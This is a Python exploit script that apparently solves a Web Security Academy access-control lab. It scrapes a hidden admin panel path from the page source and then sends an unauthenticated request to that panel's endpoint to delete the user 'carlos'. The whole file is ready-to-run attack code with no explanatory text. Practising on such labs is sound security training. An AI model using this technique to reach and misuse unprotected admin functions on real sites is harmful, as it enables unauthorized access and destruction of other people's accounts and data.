import requests
import sys
import re



def find_admin_panel(url, session):
    response = session.get(url)
    admin_panel_path = re.search("/admin-([a-zA-Z0-9]+)", response.text).group(0)
    return admin_panel_path


def delete_user(url, session, admin_panel_path):
    response = session.get(f"{url}{admin_panel_path}/delete?username=carlos", timeout=10)
    return "User deleted successfully!" in response.text


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)

    try:
        url = sys.argv[1].rstrip("/")
        session = requests.Session()
        session.mount("https://", requests.adapters.HTTPAdapter(max_retries=requests.adapters.Retry(total=3, backoff_factor=0.1)))

        print("(+) Finding admin panel...")
        admin_panel_path = find_admin_panel(url, session)
        if not admin_panel_path:
            print("(-) Something went wrong. Please check your URL and try again.")
            sys.exit(1)

        print("(+) Deleting the user \"carlos\"...")
        if delete_user(url, session, admin_panel_path):
            print("(+) Successfully deleted the user \"carlos\"!")
        else:
            print("(-) Unable to delete the user \"carlos\". Please try again. ")


    except requests.exceptions.Timeout:
        print("(-) Request timed out.")

    except requests.exceptions.MissingSchema:
        print("(-) Please enter a valid URL.")

    except requests.exceptions.ConnectionError:
        print("(-) Unable to connect to host. Please check your URL and try again.")

    except KeyboardInterrupt:
        sys.exit(1)


if __name__ == "__main__":
    main()